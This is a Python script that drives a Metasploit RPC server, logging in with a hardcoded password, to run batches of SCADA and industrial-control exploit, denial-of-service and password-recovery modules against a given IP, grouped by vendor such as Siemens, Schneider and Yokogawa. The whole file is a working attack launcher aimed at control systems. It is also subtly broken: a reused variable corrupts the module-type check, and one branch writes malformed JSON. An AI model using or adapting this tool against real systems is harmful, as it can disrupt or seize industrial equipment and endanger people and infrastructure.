from pymetasploit3.msfrpc import MsfRpcClient
import re
import sys

vendorMapmodel={
    'Advantech WebAccess':['admin/scada/advantech_webaccess_dbvisitor_sqli'],
    'General Electric':['admin/scada/ge_proficy_substitute_traversal','gather/d20pass','dos/scada/d20_tftp_overflow',
                        'windows/scada/ge_proficy_cimplicity_gefebt'],
    'Schneider':['admin/scada/modicon_command','admin/scada/modicon_password_recovery','admin/scada/modicon_stux_transfer',
                 'windows/scada/citect_scada_odbc'],
    'Allen-Bradley/Rockwell':['admin/scada/multi_cip_command'],
    'PhoenixContact PLC':['admin/scada/phoenix_command'],
    'Beckhoff':['dos/scada/beckhoff_twincat'],
    '7-Technologies':['dos/scada/igss9_dataserver','windows/scada/igss9_igssdataserver_listall',
                      'windows/scada/igss9_igssdataserver_rename','windows/scada/igss9_misc',
                      'windows/scada/igss_exec_17'],
    'Digi ADDP':['scanner/scada/digi_addp_reboot','scanner/scada/digi_addp_version'],
    'Digi International':['scanner/scada/digi_realport_serialport_scan','scanner/scada/digi_realport_version'],
    'Indusoft':['windows/scada/indusoft_webstudio_exec','scanner/scada/indusoft_ntwebserver_fileaccess'],
    'Digital Bond':['scanner/scada/koyo_login'],
    'EsMnemon':['scanner/scada/modbus_findunitid','scanner/scada/modbusclient','scanner/scada/modbusdetect'],
    'Siemens':['scanner/scada/profinet_siemens','windows/scada/factorylink_csservice',
               'windows/scada/factorylink_vrn_09'],
    'Sielco Sistemi':['scanner/scada/sielco_winlog_fileaccess','windows/scada/winlog_runtime',
                      'windows/scada/winlog_runtime_2'],
    'KeyHelp':['windows/browser/keyhelp_launchtripane_exec'],
    'TeeChart Professional':['windows/browser/teechart_pro'],
    'KingScada':['windows/browser/wellintech_kingscada_kxclientdownload'],
    'BACnet':['windows/fileformat/bacnet_csv'],
    'ScadaTec':['windows/fileformat/scadaphone_zip'],
    'ABB MicroSCADA':['windows/scada/abb_wserver_exec'],
    'Codesys':['windows/scada/codesys_gateway_server_traversal','windows/scada/codesys_web_server'],
    'AzeoTech':['windows/scada/daq_factory_bof'],
    'Iconics':['windows/scada/iconics_genbroker','windows/scada/iconics_webhmi_setactivexguid'],
    'MOXA':['windows/scada/moxa_mdmtool'],
    'Procyon':['windows/scada/procyon_core_server'],
    'DATAC RealWin':['windows/scada/realwin','windows/scada/realwin_on_fc_binfile_a','windows/scada/realwin_on_fcs_login',
                     'windows/scada/realwin_scpc_initialize','windows/scada/realwin_scpc_initialize_rf',
                     'windows/scada/realwin_scpc_txtevent'],
    'Measuresoft ScadaPro':['windows/scada/scadapro_cmdexe'],
    'Sunway':['windows/scada/sunway_force_control_netdbsrv'],
    'Yokogawa':['windows/scada/yokogawa_bkbcopyd_bof','windows/scada/yokogawa_bkesimmgr_bof',
                'windows/scada/yokogawa_bkfsim_vhfd','windows/scada/yokogawa_bkhodeq_bof',
                'dos/scada/yokogawa_logsvr','admin/scada/yokogawa_bkbcopyd_client']
}

def deviceTest(Vendor,IP,filepath):
    modules=vendorMapmodel[Vendor]
    client = MsfRpcClient('chinazfz')
    path='exploit'
    count=0
    for module in modules:
        if module in client.modules.auxiliary:
            path='auxiliary'
        if module in client.modules.exploits:
            path='exploit'
        exploit=client.modules.use(path,module)
        require=''
        print(module,exploit.required)
        for temp in exploit.missing_required:
            if re.search('HOST',temp):
                require=temp
                exploit[require]=IP
        if path=='auxiliary':
            try:
                cid=client.consoles.console().cid
                result=client.consoles.console(cid).run_module_with_output(exploit)
                path = filepath + "_" + str(count) + ".txt"
                count = count + 1
                with open(path,'w') as f:
                    writeline="{\"ip\":\""+IP+"\","+"\"vendor\":\""+Vendor+"\","+"\"module\":\""+\
                        path+"/"+module+"\","+"\"result\":\""+result+"\"}\n"
                    f.write(writeline)
                    f.close()
                print(result)
            except Exception as e:
                print(e)
        if path=='exploit':
            try:
                cid = client.consoles.console().cid
                result = client.consoles.console(cid).run_module_with_output(exploit)
                path = filepath + "_" + str(count) + ".txt"
                count = count + 1
                with open(path,'w') as f:
                    writeline="{\"ip\":\""+IP+"\","+"\"vendor\":\""+Vendor+"\","+"\"module\":\""+\
                        path+"/"+module+"\","+"\"result\":\""+result+"\""+"\"}\n"
                    f.write(writeline)
                    f.close()
                print(result)
            except Exception as e:
                print(e)
                
if __name__=='__main__':
    if len(sys.argv)>1:
        deviceTest(sys.argv[1],sys.argv[2],sys.argv[3])